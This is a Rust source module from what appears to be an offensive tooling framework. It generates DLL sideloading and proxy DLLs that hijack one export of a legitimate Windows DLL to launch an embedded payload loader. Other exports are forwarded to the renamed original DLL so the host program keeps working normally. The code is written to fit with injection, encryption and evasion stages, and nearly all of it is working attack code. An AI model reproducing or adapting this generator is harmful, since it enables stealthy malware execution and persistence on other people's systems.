//! DLL sideloading / proxying generator.
//!
//!   * **Sideload mode** — DLL with stub exports + a hijacked export that
//!     runs the embedded loader (`main()`). DllMain is a passthrough.
//!     No original DLL needed; this is a pure replacement attack.
//!
//!   * **Proxy mode** — Same hijack-export trigger, but non-hijacked exports
//!     are forwarded to the original (renamed) DLL via a `.def` file. A
//!     `dispatch_call` gateway in lib.rs ensures the payload runs once
//!     (sync_lock-guarded) while genuine traffic continues. Pulls in
//!     `dyncvoke` (git), `lazy_static`, and `obfstr`.
//!
//! The `apply()` entry point writes generated artifacts into `folder` and
//! mutates the `replacements` map. Designed to be called from `puzzle::assemble`
//! after the chosen injection template + encryption + evasions have done.

use crate::order::{SideloadConfig, SideloadMode};
use crate::pe_parser::{self, DllExport};
use anyhow::Context;
use std::collections::HashMap;
use std::fs;
use std::path::Path;

const CRATE_TYPE_CDYLIB: &str = "[lib]\ncrate-type = [\"cdylib\"]";

const PROXY_BUILD_RS: &str = r##"use std::{env, path::PathBuf};

fn main() {
    if env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() == "windows" {
        let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
        let def_path = PathBuf::from(manifest_dir).join("proxy.def");
        println!("cargo:rustc-link-arg=/DEF:{}", def_path.display());
        println!("cargo:rerun-if-changed=proxy.def");
    }
}
"##;

pub fn apply(
    config: &SideloadConfig,
    folder: &Path,
    replacements: &mut HashMap<&'static str, String>,
) -> anyhow::Result<()> {
    let exports = pe_parser::parse_exports(&config.target_dll)
        .map_err(|e| anyhow::anyhow!("Failed to parse target DLL exports: {e}"))?;
    let target_stem = pe_parser::dll_stem(&config.target_dll);

    let src_dir = folder.join("src");
    fs::create_dir_all(&src_dir).context("create src dir")?;

    // 1. Force cdylib crate type.
    replacements.insert("{{DLL_FORMAT}}", CRATE_TYPE_CDYLIB.to_string());

    // 2. Generate forward.rs (stub functions for all non-hijacked exports).
    let forward_rs = generate_forward_rs(&exports, &config.hijack_export);
    fs::write(src_dir.join("forward.rs"), forward_rs).context("write forward.rs")?;

    // 3. Build the lib.rs tail (DllMain + hijack export + optional dispatch_call + mod forward).
    let dll_block = match config.mode {
        SideloadMode::Sideload => sideload_block(&config.hijack_export),
        SideloadMode::Proxy => {
            let original_dll_path = original_path(config, &target_stem);
            proxy_block(&config.hijack_export, &original_dll_path, exports.len())
        }
    };
    replacements.insert("{{DLL_MAIN}}", dll_block);

    // 4. Proxy-mode extras: build.rs + proxy.def + dyncvoke/lazy_static deps + import.
    if matches!(config.mode, SideloadMode::Proxy) {
        fs::write(folder.join("build.rs"), PROXY_BUILD_RS).context("write build.rs")?;

        let forward_target = forward_target(config, &target_stem);
        let def_body = generate_def(&exports, &config.hijack_export, &target_stem, &forward_target);
        fs::write(folder.join("proxy.def"), def_body).context("write proxy.def")?;

        // Merge extra deps into the {{DEPENDENCIES}} placeholder (encryption may have already
        // populated it).
        let existing_deps = replacements
            .get("{{DEPENDENCIES}}")
            .cloned()
            .unwrap_or_default();
        let extra = r#"lazy_static = "1.4"
dyncvoke = { git = "https://github.com/Whitecat18/Dyncvoke" }"#;
        let merged_deps = if existing_deps.is_empty() {
            extra.to_string()
        } else {
            format!("{existing_deps}\n{extra}")
        };
        replacements.insert("{{DEPENDENCIES}}", merged_deps);

        // Append lazy_static import to {{IMPORTS}}.
        let existing_imports = replacements
            .get("{{IMPORTS}}")
            .cloned()
            .unwrap_or_default();
        let new_imports = if existing_imports.is_empty() {
            "use lazy_static::lazy_static;".to_string()
        } else {
            format!("{existing_imports}\nuse lazy_static::lazy_static;")
        };
        replacements.insert("{{IMPORTS}}", new_imports);
    }

    Ok(())
}

fn original_path(config: &SideloadConfig, target_stem: &str) -> String {
    if config.use_absolute_path {
        // Use the full target DLL path; escape backslashes for Rust string literal.
        config.target_dll.display().to_string().replace('\\', "\\\\")
    } else if !config.renamed.trim().is_empty() {
        config.renamed.trim().to_string()
    } else {
        // Sensible default: "<stem>_orig.dll"
        format!("{target_stem}_orig.dll")
    }
}

fn forward_target(config: &SideloadConfig, target_stem: &str) -> String {
    if config.use_absolute_path {
        // .def forwarder uses the path without extension.
        let p = config.target_dll.with_extension("");
        p.display().to_string()
    } else if !config.renamed.trim().is_empty() {
        // Strip .dll suffix for .def forwarder.
        Path::new(config.renamed.trim())
            .file_stem()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| format!("{target_stem}_orig"))
    } else {
        format!("{target_stem}_orig")
    }
}

fn generate_forward_rs(exports: &[DllExport], hijack: &str) -> String {
    let mut out = String::new();
    out.push_str("// Auto-generated stub functions. The .def file (proxy mode) overrides these\n");
    out.push_str("// with forwarders; in sideload mode they remain as no-ops so the DLL\n");
    out.push_str("// still satisfies the host's GetProcAddress lookups.\n\n");
    for export in exports {
        if let Some(name) = &export.name {
            if name != hijack {
                out.push_str(&format!(
                    "#[no_mangle]\npub unsafe extern \"system\" fn {name}() {{}}\n"
                ));
            }
        }
    }
    out
}

fn sideload_block(hijack_export: &str) -> String {
    format!(
        r##"
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
extern "system" fn DllMain(_dll: usize, reason: u32, _r: *mut ()) -> bool {{
    match reason {{
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }}
    true
}}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub unsafe extern "system" fn {hijack_export}(
    _a1: u64, _a2: u64, _a3: u64, _a4: u64, _a5: u64, _a6: u64, _a7: u64, _a8: u64,
    _a9: u64, _a10: u64, _a11: u64, _a12: u64, _a13: u64, _a14: u64, _a15: u64, _a16: u64,
    _a17: u64, _a18: u64, _a19: u64, _a20: u64,
) -> u64 {{
    main();
    1
}}

mod forward;
"##
    )
}

fn proxy_block(hijack_export: &str, original_dll_path: &str, num_exports: usize) -> String {
    // The dispatch_call gateway runs main() once (sync_lock-guarded) then forwards
    // calls to the original DLL via dyncvoke. Hijacked export = export_id 0.
    format!(
        r##"
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
extern "system" fn DllMain(_dll: usize, reason: u32, _r: *mut ()) -> bool {{
    match reason {{
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }}
    true
}}

lazy_static! {{
    static ref DLL_NAME: String = "{original_dll_path}".to_string();
}}

static mut RP_CALLBACK_TABLE: [usize; {num_exports}] = [0usize; {num_exports}];
static RP_SYNC_LOCK: std::sync::Mutex<i32> = std::sync::Mutex::new(0);

fn rp_dispatch_call(
    a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64,
    a9: u64, a10: u64, a11: u64, a12: u64, a13: u64, a14: u64, a15: u64, a16: u64,
    a17: u64, a18: u64, a19: u64, a20: u64,
    export_id: u32,
) -> u64 {{
    {{
        let mut guard = RP_SYNC_LOCK.lock().unwrap();
        if *guard == 0 {{
            *guard = 1;
            drop(guard);
            std::thread::spawn(|| {{ main(); }});
        }}
    }}

    unsafe {{
        if RP_CALLBACK_TABLE[export_id as usize] != 0 {{
            let target: extern "system" fn(
                u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
                u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
            ) -> u64 = std::mem::transmute(RP_CALLBACK_TABLE[export_id as usize]);
            return target(
                a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
                a11, a12, a13, a14, a15, a16, a17, a18, a19, a20,
            );
        }}
    }}

    let proc_name = match export_id {{
        0 => "{hijack_export}".to_string(),
        _ => String::new(),
    }};
    if proc_name.is_empty() {{
        return 0;
    }}

    let dll_name = DLL_NAME.as_str();
    let module_handle = dyncvoke::dyncvoke_core::load_library_a(dll_name);
    if module_handle == 0 {{
        return 0;
    }}

    let proc_addr = dyncvoke::dyncvoke_core::get_function_address(module_handle, &proc_name);
    if proc_addr == 0 {{
        return 0;
    }}

    unsafe {{
        RP_CALLBACK_TABLE[export_id as usize] = proc_addr;
        let target: extern "system" fn(
            u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
            u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
        ) -> u64 = std::mem::transmute(proc_addr);
        return target(
            a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
            a11, a12, a13, a14, a15, a16, a17, a18, a19, a20,
        );
    }}
}}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub unsafe extern "system" fn {hijack_export}(
    a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64,
    a9: u64, a10: u64, a11: u64, a12: u64, a13: u64, a14: u64, a15: u64, a16: u64,
    a17: u64, a18: u64, a19: u64, a20: u64,
) -> u64 {{
    rp_dispatch_call(
        a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
        a11, a12, a13, a14, a15, a16, a17, a18, a19, a20,
        0,
    )
}}

mod forward;
"##
    )
}

fn generate_def(
    exports: &[DllExport],
    hijack: &str,
    target_stem: &str,
    forward_target: &str,
) -> String {
    let mut def = format!("LIBRARY {target_stem}\nEXPORTS\n");
    for export in exports {
        let Some(name) = &export.name else { continue };
        if name == hijack {
            // Hijacked export: no forwarder, lib.rs's hijack fn handles it.
            def.push_str(&format!("    {name} @{}\n", export.ordinal));
        } else {
            def.push_str(&format!(
                "    {name}={forward_target}.{name} @{}\n",
                export.ordinal
            ));
        }
    }
    def
}
